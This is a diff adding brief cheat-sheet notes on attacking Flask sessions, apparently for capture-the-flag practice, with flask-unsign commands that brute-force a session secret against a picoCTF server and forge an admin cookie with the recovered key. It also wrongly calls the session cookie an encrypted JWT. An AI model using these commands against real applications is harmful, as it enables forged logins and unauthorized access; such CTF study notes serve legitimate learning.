@@ -1,0 +1,8 @@
+### Flask
+
+* flask-unsign
+    * The session an encrypted JWT token
+    * Find the secret key
+        * `flask-unsign --unsign --server "http://mercury.picoctf.net:52134/" --wordlist wordlist.txt`
+    * Sign the cookie with the secret key
+        * `flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"`
